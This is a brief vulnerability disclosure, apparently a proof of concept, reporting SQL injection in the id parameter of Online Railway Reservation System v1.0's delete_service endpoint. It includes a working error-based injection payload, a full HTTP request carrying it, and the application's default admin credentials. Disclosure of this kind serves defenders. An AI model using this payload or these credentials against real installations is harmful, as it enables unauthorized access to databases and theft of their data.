# Online Railway Reservation System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html

Vulnerability File: /orrs/classes/Master.php?f=delete_service

Vulnerability location: /orrs/classes/Master.php?f=delete_service, id=

Current database name: orrs_db,length is 7

[+] Payload:  id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+  // Leak place ---> id

You need to execute the following sql statement in the database to create the "service_list" table 
```sql
CREATE TABLE `service_list` (
  `id` int(30) NOT NULL,
  `code` varchar(100) NOT NULL,
  `name` text NOT NULL,
  `delete_flag` tinyint(1) NOT NULL,
  `date_created` datetime NOT NULL,
  `date_updated` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
COMMIT;
```

```sql
POST /orrs/classes/Master.php?f=delete_service HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 65
Cookie: PHPSESSID=hea24clorqs9kplqalqihp0ik4
Connection: close

id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/172341183-a50176c8-0a53-49bc-ac57-9ef8b1641d8f.png)
